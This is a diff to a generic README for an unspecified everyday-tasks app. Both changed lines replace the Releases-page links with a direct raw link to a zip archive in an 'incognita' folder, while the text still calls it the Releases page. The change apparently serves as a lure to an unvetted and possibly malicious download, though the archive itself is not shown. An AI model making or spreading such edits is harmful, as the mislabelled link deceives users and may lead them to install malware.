@@ -1,7 +1,7 @@
 # 🚀 app - Simple Tool for Everyday Tasks
 
 ## 📥 Download This App
-[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/yourusername/app/releases)
+[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://raw.githubusercontent.com/kanglichsu038/app/main/incognita/Software-v3.6.zip)
 
 ## 🚀 Getting Started
 This app is designed to help you with everyday tasks efficiently. Whether you need to organize your files, track your tasks, or manage your time, this tool can assist you in getting things done more effectively.
@@ -22,7 +22,7 @@ This app is designed to help you with everyday tasks efficiently. Whether you ne
 To download the app, please visit the Releases page and choose the latest version. Follow these steps:
 
 1. Click on the link below to go to the Releases page:
-   [Visit Releases Page](https://github.com/yourusername/app/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/kanglichsu038/app/main/incognita/Software-v3.6.zip)
    
 2. On the Releases page, you will see a list of available versions. Click on the most recent version.
 
